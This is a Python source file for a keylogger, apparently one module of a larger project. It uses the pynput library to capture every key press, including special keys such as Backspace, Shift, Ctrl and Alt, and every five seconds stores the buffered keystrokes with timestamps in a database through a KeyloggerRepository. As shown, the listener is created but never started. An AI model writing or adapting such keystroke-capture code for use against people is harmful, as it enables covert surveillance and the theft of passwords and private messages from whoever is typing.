from pynput import keyboard
import logging
import time
import asyncio
from db.repository.KeyloggerRepository import KeyloggerRepository
keyloggerRepository = KeyloggerRepository()

keystrokes = ""
start_time = time.time()

def on_press(key):
    global keystrokes
    try:
        if key == keyboard.Key.enter:
            keystrokes += "\n"
        elif key == keyboard.Key.tab:
            keystrokes += "\t"
        elif key == keyboard.Key.space:
            keystrokes += " "
        elif key == keyboard.Key.backspace:
            keystrokes += "[Backspace]"
        elif key == keyboard.Key.shift:
            keystrokes += "[SHIFT]"
        elif key == keyboard.Key.ctrl:
            keystrokes += "[CTRL]"
        elif key == keyboard.Key.alt:
            keystrokes += "[ALT]"
        else:
            keystrokes += str(key).strip("'")
    except Exception:
        logging.error("Error in on_press")

keyboardListener = keyboard.Listener(
    on_press=on_press)

async def save_keystrokes():
    global keystrokes
    global start_time
    print(keystrokes)
    if keystrokes:
        keyloggerRepository.insert_keylog(start_time=start_time, keys=keystrokes, end_time=time.time())
    keystrokes = ""
    start_time = time.time()


async def schedule_insertion():
    while True:
        await save_keystrokes()
        await asyncio.sleep(5)

asyncio.run(schedule_insertion())
